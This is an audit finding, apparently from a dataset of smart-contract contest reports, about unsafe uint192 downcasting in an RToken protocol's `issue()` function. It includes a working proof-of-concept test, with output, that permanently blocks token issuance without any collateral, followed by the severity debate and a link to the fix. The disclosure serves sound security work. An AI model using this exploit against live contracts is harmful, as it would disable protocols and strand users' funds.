# [M] Unsafe downcasting in `issue`

## Summary
Severity: Medium
Contest weight: 0.7436
Dataset id: 18087
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Important note!

I first found this bug in `issue(...)`, but unsafe downcasting appears in many other areas of the codebase, and seem to also be exploitable but no PoC is provided due to time constraints. Either way, using some form of safe casting library to **replace all occurences** of unsafe downcasting will prevent all the issues. I also do not list the individual instances of unsafe downcasting as all occurences should be replaced with safe cast.

## Proof of Concept
This PoC demonstrates that an attacker can call `issue(...)` without collateral tokens to modify `allVestAt` variable to an extreme value, such that all further issuances cannot be vested for all users.

Do note that the PoC is done with `totalSupply() == 0` case, so we supply `amtRToken` as a multiple of $2^{192}$. Even if there is an existing `totalSupply()`, we just need to calculate a value for `amtRToken >= 2^192` such that $\frac{\text{basketsNeeded} \times \text{amtRToken}}{totalSupply()} = 0$. This attack does not require `totalSupply()` be zero.

```solidity
uint192 amtBaskets = uint192(
	totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken
);
```

The `amount`, `baskets` and `quantities` values are also messed up, but it would not matter anyways…

Under ‘Issuance and Slow Minting’ tests in `RToken.test.ts`:

```solidity
it('Audit: DoS by downcasting', async function () {
      const issueAmount: BigNumber = BigNumber.from(2n ** 192n)

      // Set basket
      await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])
      await basketHandler.connect(owner).refreshBasket()

      // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens
      // This will cause allVestAt to be veryyyyy high, permanent DoS
      const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)
      const receipt = await tx.wait()
      console.log(receipt.events[0].args)
  
      await token0.connect(addr2).approve(rToken.address, initialBal)
      const tx2 = await rToken.connect(addr2)['issue(uint256)'](initialBal)
      const receipt2 = await tx2.wait()
      console.log(receipt2.events[0].args)

      // one eternity later...
      await advanceTime('123456789123456789')
      // and still not ready
      await expect(rToken.connect(addr2).vest(addr2.address, 1))
        .to.be.revertedWith("issuance not ready")

    })
```

Run with:

```
yarn test:p1 --grep "Audit: DoS"
```

Expect to see (only important parts shown):

```
[
  ...
  recipient: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
  index: BigNumber { value: "0" },
  amount: BigNumber { value: "6277101735386680763835789423207666416102355444464034512896" },
  baskets: BigNumber { value: "0" },
  erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],
  quantities: [ BigNumber { value: "0" } ],
  blockAvailableAt: BigNumber { value: "627710173538668076383578942320766744610235544446403452" }
]
[
  ...
  recipient: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',
  index: BigNumber { value: "0" },
  amount: BigNumber { value: "6300000000000000000000000000000000000000000000000000000000" },
  baskets: BigNumber { value: "22898264613319236164210576792333583897644555535965487104" },
  erc20s: [ '0x998abeb3E57409262aE5b751f60747921B33613E' ],
  quantities: [
    BigNumber { value: "22898264613319236164210576792333583897644555535965487104" }
  ],
  blockAvailableAt: BigNumber { value: "1257710173538668076383578942320766744610235544446403452" }
]

  RTokenP1 contract
    Issuance and Slow Minting
      ✔ Audit: DoS by downcasting
```

## Recommendation
Use some safe casting library. OpenZeppelin’s library does not have safe casting for `uint192` type. May have to find another or write your own.

Will leave open for sponsor review, I think Medium severity is correct if the finding turns out to be fully valid. If no more issuance can occur, redemption is still possible. Warden would have needed to demonstrate a loss of funds for this to qualify as H severity. 

We have supported ranges of value. See `docs/solidity-style.md`. 

The only mistake here is that `issue()` has somewhat lacking in-line documentation:  

> Downcast is safe because an actual quantity of qBUs fits in uint192

The comment in `redeem()` is a bit better:  

> // downcast is safe: amount < totalSupply and basketsNeeded_ < 1e57 < 2^190 (just barely)

We’ll probably improve the comment in `issue()` to match `redeem()`. This should be a QA-level issue. 

I don’t see how documentation prevents this issue. 

The issue exists because downcasting values above 2^192 does not revert. Maybe the sponsor misunderstood the issue thinking that it would require the attacker to deposit 2^192 of the collateral in order for the attack to succeed which is an extremely unlikely scenario.

Updated the PoC to clearly show that the attacker can permanently disable the `issue(...)` function for the protocol, without owning any amount of the basket token. - addr1 is the attacker with 0 basket tokens, addr2 represents all future users who will not be able to issue new RTokens.
    
```solidity
    it('Audit: DoS by downcasting', async function () {
          const issueAmount: BigNumber = BigNumber.from(2n ** 192n)
          
          await token0.burn(addr1.address, bn('6.3e57'))
          await token0.burn(addr2.address, bn('6.3e57'))
          // await token0.mint(addr1.address, bn('10e18'))
          await token0.mint(addr2.address, bn('10e18'))
          expect(await token0.balanceOf(addr1.address)).to.eq(0)
          expect(await token0.balanceOf(addr2.address)).to.eq(bn('10e18'))
          
          // Set basket
          await basketHandler.connect(owner).setPrimeBasket([token0.address], [fp('1')])
          await basketHandler.connect(owner).refreshBasket()
          
          // Attacker issues 2 ** 192, or a multiple of 2 ** 192 RTokens
          // This will cause allVestAt to be very high, permanent DoS
          const tx = await rToken.connect(addr1)['issue(uint256)'](issueAmount)
          const receipt = await tx.wait()
          console.log(receipt.events[0].args)
      
          await token0.connect(addr2).approve(rToken.address, bn('10e18'))
          const tx2 = await rToken.connect(addr2)['issue(uint256)'](bn('10e18'))
          const receipt2 = await tx2.wait()
          console.log(receipt2.events[0].args)
          
          // one eternity later...
          await advanceTime('123456789123456789')
          // and still not ready
          await expect(rToken.connect(addr2).vest(addr2.address, 1))
            .to.be.revertedWith("issuance not ready")
        })
```

Additionally, I still believe this issue should be considered High risk as:

1. Disabling of critical function of the protocol
2. Attack is very simple to exploit, with no cost to the attacker - Low complexity with High likelihood
3. Permanent disabling of RToken issuance means that the **RToken can no longer be used** so all funds must be moved out, this will entail:
4. Redeeming all existing RTokens, which will take a reasonable amount of time depending on redemption battery parameters
5. Unstaking all stRSR which will take a reasonable amount of time depending on unstaking delay
6. Gas costs for all the above redeeming and unstaking will be in the thousands for a RToken with reasonable market cap. 
7. RToken is a stable currency which means that it would be used in DeFi protocols. In the case of Lending/Borrowing, it would take even longer for RToken to be redeemed. There may also be loss of funds as a long wait time to redeem RTokens means that the RToken will trade at a discount in secondary markets - this can cause RToken-collateralized loans to be underwater.


There is no **direct** loss of funds but I’d argue the impact is vast due to RToken being used as a currency.

Thanks for the response. 

> There is no direct loss of funds but I’d argue the impact is vast due to RToken being used as a currency.

If there is no direct loss of funds, how can this issue be High per the C4 criteria, not your own opinion?

I will ask @tbrent to take another look at your POC and do the same as well. 

I agree with Medium if following C4 criteria in the docs exactly word for word.

It is just that there are many High findings in previous contests where High findings did not need to cause direct loss of funds, but break an important functionality in the protocol.

To be clear, this issue does lead to loss of funds. It is just that it may not be considered **direct**.

It is indeed my opinion that the finding should be High, but the points listed below are all facts. I will respect your decision regardless. Thanks!

Apologies, I misunderstood the issue the first time I read through it…indeed this can be used to mint large amounts of RToken to yourself while putting down very little in collateral, while pushing `allVestAt` extremely far into the future. 

Since `issuanceRate` cannot be disabled, and cannot be above 100%, there is no way for the absurdly high RToken mint to finish vesting. In the event of the attack, RToken issuance would be bricked but redemption would remain enabled, and since no RToken is minted until vesting the redemptions would still function. I think this is a Medium. 

Thanks for all the conversation, marking as Medium. 

This PR makes all dangerous uint192 downcasts truncation-safe: [reserve-protocol/protocol#628](https://github.com/reserve-protocol/protocol/pull/628)
